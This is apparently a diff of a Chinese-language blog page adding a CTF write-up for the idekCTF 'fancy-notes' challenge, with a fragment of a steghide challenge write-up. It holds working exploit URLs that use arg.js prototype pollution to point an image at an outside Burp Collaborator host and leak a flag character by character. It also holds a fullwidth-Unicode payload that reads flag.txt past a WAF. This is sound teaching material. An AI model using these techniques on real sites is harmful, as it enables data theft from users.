+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/fancy&#39;</span><span style=color:#111>)</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>fancify</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>session</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#d88200>&#39;q&#39;</span> <span style=color:#f92672>in</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#111>:</span> <span style=color:#75715e># 不论get or post</span>
+        <span style=color:#00a8c8>def</span> <span style=color:#75af00>filter</span><span style=color:#111>(</span><span style=color:#111>obj</span><span style=color:#111>):</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>any</span><span style=color:#111>([</span><span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#111>v</span><span style=color:#111>)</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span> <span style=color:#f92672>and</span> <span style=color:#111>k</span> <span style=color:#f92672>!=</span> <span style=color:#d88200>&#39;q&#39;</span> <span style=color:#00a8c8>for</span> <span style=color:#111>k</span><span style=color:#111>,</span> <span style=color:#111>v</span> <span style=color:#f92672>in</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#f92672>.</span><span style=color:#111>items</span><span style=color:#111>()])</span>  <span style=color:#75715e># 长度不超过1</span>
+        <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>filter</span><span style=color:#111>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#111>):</span>
+            <span style=color:#111>results</span> <span style=color:#f92672>=</span> <span style=color:#111>find_note</span><span style=color:#111>(</span><span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>args</span><span style=color:#111>[</span><span style=color:#d88200>&#39;q&#39;</span><span style=color:#111>],</span> <span style=color:#111>session</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>])</span>   <span style=color:#75715e># 查找user的note q是title或content</span>
+            <span style=color:#00a8c8>if</span> <span style=color:#111>results</span><span style=color:#111>:</span>
+                <span style=color:#111>message</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;here is your 𝒻𝒶𝓃𝒸𝓎 note!&#39;</span>
+            <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
+                <span style=color:#111>message</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;no notes found!&#39;</span>
+            <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fancy.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>note</span><span style=color:#f92672>=</span><span style=color:#111>results</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#111>message</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fancy.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;bad format! Your style params should not be so long!&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fancy.html&#39;</span><span style=color:#111>)</span>
+
+
+<span style=color:#75af00>@app</span><span style=color:#f92672>.</span><span style=color:#111>route</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/report&#39;</span><span style=color:#111>,</span> <span style=color:#111>methods</span><span style=color:#f92672>=</span><span style=color:#111>[</span><span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;POST&#39;</span><span style=color:#111>])</span>
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>report</span><span style=color:#111>():</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#f92672>not</span> <span style=color:#111>session</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>if</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>method</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;GET&#39;</span><span style=color:#111>:</span>
+        <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;report.html&#39;</span><span style=color:#111>)</span>
+    <span style=color:#111>url</span> <span style=color:#f92672>=</span> <span style=color:#111>request</span><span style=color:#f92672>.</span><span style=color:#111>form</span><span style=color:#111>[</span><span style=color:#d88200>&#39;url&#39;</span><span style=color:#111>]</span>
+    <span style=color:#111>subprocess</span><span style=color:#f92672>.</span><span style=color:#111>Popen</span><span style=color:#111>([</span><span style=color:#d88200>&#39;node&#39;</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;bot.js&#39;</span><span style=color:#111>,</span> <span style=color:#111>url</span><span style=color:#111>],</span> <span style=color:#111>shell</span><span style=color:#f92672>=</span><span style=color:#00a8c8>False</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>render_template</span><span style=color:#111>(</span><span style=color:#d88200>&#39;report.html&#39;</span><span style=color:#111>,</span> <span style=color:#111>message</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;admin visited your url!&#39;</span><span style=color:#111>)</span>
+
+
+
+<span style=color:#111>app</span><span style=color:#f92672>.</span><span style=color:#111>run</span><span style=color:#111>(</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>1337</span><span style=color:#111>)</span>
+
+</code></pre></div><p>除了app.py还有一个fancify.js有点东西</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>function</span> <span style=color:#75af00>fancify</span><span style=color:#111>(</span><span style=color:#75af00>note</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>color</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#75af00>args</span><span style=color:#111>.</span><span style=color:#75af00>style</span> <span style=color:#f92672>||</span> <span style=color:#111>Math</span><span style=color:#111>.</span><span style=color:#75af00>floor</span><span style=color:#111>(</span><span style=color:#111>Math</span><span style=color:#111>.</span><span style=color:#75af00>random</span><span style=color:#111>()</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>6</span><span style=color:#111>)).</span><span style=color:#75af00>toString</span><span style=color:#111>();</span>
+	<span style=color:#75af00>image</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>image</span> <span style=color:#f92672>||</span> <span style=color:#d88200>&#39;/static/images/success.png&#39;</span><span style=color:#111>;</span>	<span style=color:#75715e>// 支持传入image参数
+</span><span style=color:#75715e></span>	<span style=color:#75af00>styleElement</span> <span style=color:#f92672>=</span> <span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>children</span><span style=color:#111>[</span><span style=color:#ae81ff>2</span><span style=color:#111>];</span>
+	<span style=color:#75af00>styleElement</span><span style=color:#111>.</span><span style=color:#75af00>innerHTML</span> <span style=color:#f92672>=</span> <span style=color:#75af00>style</span><span style=color:#111>;</span> <span style=color:#75715e>// i have no idea why i did this in such a scuffed way but I&#39;m too lazy to change it. no this is not vulnerable
+</span><span style=color:#75715e></span>	<span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>className</span> <span style=color:#f92672>=</span> <span style=color:#d88200>`animation</span><span style=color:#d88200>${</span><span style=color:#75af00>color</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>;</span>
+	<span style=color:#75af00>img</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>Image</span><span style=color:#111>();</span>
+	<span style=color:#75af00>img</span><span style=color:#111>.</span><span style=color:#75af00>src</span> <span style=color:#f92672>=</span> <span style=color:#75af00>image</span>
+	<span style=color:#75af00>note</span><span style=color:#111>.</span><span style=color:#75af00>append</span><span style=color:#111>(</span><span style=color:#75af00>img</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+
+<span style=color:#75af00>args</span> <span style=color:#f92672>=</span> <span style=color:#75af00>Arg</span><span style=color:#111>.</span><span style=color:#75af00>parse</span><span style=color:#111>(</span><span style=color:#75af00>location</span><span style=color:#111>.</span><span style=color:#75af00>search</span><span style=color:#111>);</span>
+<span style=color:#75af00>noteElement</span> <span style=color:#f92672>=</span> <span style=color:#111>document</span><span style=color:#111>.</span><span style=color:#75af00>getElementById</span><span style=color:#111>(</span><span style=color:#d88200>&#39;note&#39;</span><span style=color:#111>);</span>
+
+<span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>noteElement</span><span style=color:#111>){</span>
+	<span style=color:#75af00>fancify</span><span style=color:#111>(</span><span style=color:#75af00>noteElement</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+
+</code></pre></div><p>交互过程总体是这样的：可以输入并保存note，之后选择我们的note将其fancify之后渲染出来</p>
+<pre tabindex=0><code>http://fancy-notes.chal.idek.team/fancy?q=Note+1&amp;style=2
+</code></pre><p>其中除了q以外的参数长度不超过1，如果没有指定image并且note存在就会出现success.png的图片，指定了的话就是对应图片</p>
+<p>另外还有一个经典report的bot，它以admin身份登入后写入一条含有flag的note，之后访问我们的url</p>
+<p>我一开始在python的SSTI部分浪费了一部分时间，想着明明没有过滤为什么不能执行命令，后来才知道考点就不在这里</p>
+<p>这个题其实跟[uiuCTF2021]YANA很像，也是纯client-side安全问题和char-by-char思想的运用，而更方便的是这里连回显方式都十分明确：含有指定内容的note存在则渲染success.png 不存在则不渲染，并且这个图片我们可以指定，那将其设为我们自己服务器上的图片，并char-by-char的盲注查询字符就可以得到flag的内容了，就像这样</p>
+<pre tabindex=0><code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
+</code></pre><p>不够并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？</p>
+<p>肥肠的鸡贼，在fancy.html中引入了一个外部的js脚本</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>script</span> <span style=color:#75af00>src</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js&#34;</span><span style=color:#111>&gt;&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
+</code></pre></div><p>而这个arg.js是存在js原型污染的洞并且有现成的POC->https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md</p>
+<p>这不就好说了？</p>
+<pre tabindex=0><code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;__proto__[image]=x&amp;__proto__[image]=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
+</code></pre><p>之后只需要对q参数的后面char-by-char地盲注即可</p>
+<p>参考：<a href=https://fireshellsecurity.team/idekctf-writeups/#fancy-notes>wp</a></p>
 <h2 id=steghide-as-a-service>steghide-as-a-service</h2>
 <blockquote>
 <p>As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.</p>
@@ -526,9 +740,11 @@
 ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116) + ｃｈｒ(120) + ｃｈｒ(116)).ｒｅａｄ(115))
 </code></pre><p>参考：<a href=https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html>WAF Bypassing with Unicode Compatibility</a></p>
 <hr>
-<p>少了三道js的题，我的，下次一定！</p>
+<p><del>少了三道js的题，我的，下次一定！</del></p>
+<p>现在少2道了</p>
 <p>另外steghide-as-a-service这道题感谢师傅的帮助（我自己卡到一个很蠢的地方了</p>
-<p>最近有点摆烂，属于是春困秋乏里面的冬眠了，我尽量保持一个好的状态</p>
+<p>最近有点摆烂，属于是春困秋乏里面的冬眠了，睡不醒的冬三月啊啊啊啊啊啊</p>
+<p>北京冬至的时候日出日落之间只有9个半小时不到，谁听了不想睡死过去（</p>
 </div>
 </section>
 </article>
@@ -616,7 +832,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 4219 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 5977 words in this page.
 </div>
 </div>
 </div>
